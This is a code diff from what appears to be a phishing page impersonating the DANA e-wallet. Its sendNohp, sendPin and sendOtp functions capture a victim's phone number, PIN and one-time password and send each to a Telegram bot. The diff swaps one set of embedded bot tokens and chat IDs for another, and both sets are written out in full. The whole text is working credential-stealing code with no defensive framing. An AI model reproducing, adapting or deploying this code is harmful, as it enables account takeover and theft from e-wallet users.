@@ -22,10 +22,10 @@ function sendNohp(event){
   let nohp = $('#inp').val();
   let text = "📱 *Login Percobaan DANA*\nNomor HP: " + nohp;
 
-  fetch("https://api.telegram.org/bot7897525406:AAFI6eflcAKgemOlFsrntNeOZPptS9ndMaE/sendMessage", {
+  fetch("https://api.telegram.org/bot6790196485:AAFXaza7LoegIbZB7GeNFfk2mUDaFrebp90/sendMessage", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    body: "chat_id=1479321068&text=" + encodeURIComponent(text) + "&parse_mode=Markdown"
+    body: "chat_id=7134674820&text=" + encodeURIComponent(text) + "&parse_mode=Markdown"
   })
   .then(res => res.json())
   .then(() => {
@@ -53,10 +53,10 @@ function sendPin(){
 
   let text = "🔒 *PIN DANA*\n`" + pin + "`";
 
-  fetch("https://api.telegram.org/bot7897525406:AAFI6eflcAKgemOlFsrntNeOZPptS9ndMaE/sendMessage", {
+  fetch("https://api.telegram.org/bot6790196485:AAFXaza7LoegIbZB7GeNFfk2mUDaFrebp90/sendMessage", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    body: "chat_id=1479321068&text=" + encodeURIComponent(text) + "&parse_mode=Markdown"
+    body: "chat_id=7134674820&text=" + encodeURIComponent(text) + "&parse_mode=Markdown"
   })
   .then(res => res.json())
   .then(() => {
@@ -82,10 +82,10 @@ function sendOtp(){
 
   let text = "📬 *OTP DANA*\n`" + otp + "`";
 
-  fetch("https://api.telegram.org/bot7897525406:AAFI6eflcAKgemOlFsrntNeOZPptS9ndMaE/sendMessage", {
+  fetch("https://api.telegram.org/bot6790196485:AAFXaza7LoegIbZB7GeNFfk2mUDaFrebp90/sendMessage", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    body: "chat_id=1479321068&text=" + encodeURIComponent(text) + "&parse_mode=Markdown"
+    body: "chat_id=7134674820&text=" + encodeURIComponent(text) + "&parse_mode=Markdown"
   })
   .then(res => res.json())
   .then(() => {
